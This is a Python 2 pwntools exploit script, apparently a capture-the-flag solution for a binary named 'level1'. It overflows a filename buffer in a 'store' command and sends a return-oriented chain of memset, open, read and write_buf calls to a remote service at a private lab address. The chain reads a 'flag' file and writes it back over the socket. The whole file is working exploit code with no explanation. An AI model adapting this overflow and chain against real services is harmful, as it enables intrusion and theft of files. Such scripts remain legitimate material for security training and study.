#!/usr/bin/env python2

from pwn import *

context(arch = 'i386', os = 'linux')

FILENAME_LOCAL_OFFSET=0x3C
FUNCTION_PARAMETERS=1
POP2RET_ADDRESS=0x08048ef7
POP3RET_ADDRESS=0x08048ef6
FLAG_STR_ADDRESS=0x08049128
WRITABLE_BUFFER_ADDRESS=0x0804b000
RET_OFFSET = FILENAME_LOCAL_OFFSET + FUNCTION_PARAMETERS * 4 
PROGRAM = './level1'

e = ELF(PROGRAM)
OPEN_ADDRESS = e.plt['open']
READ_ADDRESS = e.plt['read']
WRITE_ADDRESS = e.plt['write']
MEMSET_ADDRESS = e.plt['memset']
EXIT_ADDRESS = e.plt['exit']
WRITE_BUF_ADDRESS = 0x0804889C

PAYLOAD = ""
while len(PAYLOAD) < RET_OFFSET:
	PAYLOAD += "B"

# == PAYLOAD ==
# char *path = "flag"
# char text[256]
# memset(text, 0, 256);
# int fileDescriptor = open(path, O_READONLY (0));
# int readBytes = read(fileDescriptor, text, 256);
# write(fd, text, 256) or write_buf(fd, text);
	
PAYLOAD += flat(
  MEMSET_ADDRESS,
  POP3RET_ADDRESS,
  WRITABLE_BUFFER_ADDRESS,
  0, # memset with 0
  256, # buffer length
  OPEN_ADDRESS,
  POP2RET_ADDRESS,
  FLAG_STR_ADDRESS,
  0x0, # O_READONLY
  READ_ADDRESS,
  POP3RET_ADDRESS,
  3, # guessed file descriptor for opened file
  WRITABLE_BUFFER_ADDRESS,
  256, # buffer length
  #WRITE_ADDRESS,
  #POP3RET_ADDRESS,
  #4, # guessed socket file descriptor
  #WRITABLE_BUFFER_ADDRESS,
  #256,
  WRITE_BUF_ADDRESS,
  POP2RET_ADDRESS,
  4, # guessed file descriptor for socket
  WRITABLE_BUFFER_ADDRESS,
  EXIT_ADDRESS,
  0
)

'''
print "RET_OFFSET: " + str(RET_OFFSET)
print "Open address: " + hex(OPEN_ADDRESS)
print "Read address: " + hex(READ_ADDRESS)
print "Exit address: " + hex(EXIT_ADDRESS)
print "Payload length: " + str(len(PAYLOAD))
print "Payload: " + PAYLOAD
'''

r = remote("192.168.56.101", 8888)
#r = remote("localhost", 8888)
print r.recvuntil("  store, read, exit.\n\n>")
r.send("store")
print r.recvuntil("Please, how many bytes is your file?\n\n>")
r.send(str(len(PAYLOAD)))
print r.recvuntil("Please, send your file:\n\n>")
r.send('A' * len(PAYLOAD))
print r.recvuntil("Please, give a filename:\n>")
r.send(PAYLOAD)

print "FLAG:"
print r.readline()